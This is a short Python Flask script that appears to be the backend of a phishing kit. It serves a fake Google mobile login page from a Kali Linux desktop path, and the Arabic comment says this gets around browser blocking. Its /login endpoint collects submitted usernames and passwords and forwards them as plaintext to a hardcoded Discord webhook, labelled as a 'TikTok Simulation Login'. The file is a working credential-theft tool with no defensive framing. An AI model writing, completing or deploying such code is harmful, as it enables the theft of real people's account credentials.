from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563282121844461699/-R07P3n__ymMGKZd_g1hKtAfswhZBONqsMRyMx94eyZt10-YQkFIKcMfCuX7atETkVGH"

# كود لعرض صفحة الـ HTML مباشرة من السيرفر لتخطي حظر المتصفح
@app.route('/')
def home():
    try:
        with open("/home/kali/Desktop/login-google-mobile.html", "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        return f"Error loading HTML file: {e}"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return jsonify({"status": "error", "message": "Missing fields"}), 400

    log_message = f"🚨 !New TikTok Simulation Login\n(User: {username}, Pass: {password})"
    
    payload = {"content": log_message}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
